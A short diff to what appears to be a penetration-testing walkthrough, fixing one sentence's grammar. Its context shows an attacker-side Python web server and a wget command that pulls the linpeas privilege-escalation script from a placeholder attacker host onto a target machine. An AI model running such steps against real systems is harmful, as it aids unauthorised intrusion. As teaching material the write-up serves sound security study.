@@ -108,7 +108,7 @@ python -m SimpleHTTPServer
 
 ![image](https://user-images.githubusercontent.com/76821053/129367542-332de915-4507-470a-9c5f-b2d71dd72cf9.png)
 
-From the target machine we can just use a few commands to download linpeas and make executable:
+From the target machine we can just use a few commands to download linpeas and make it executable:
 
 ```
 wget http://your_host_ip_address:8000/linpeas.sh
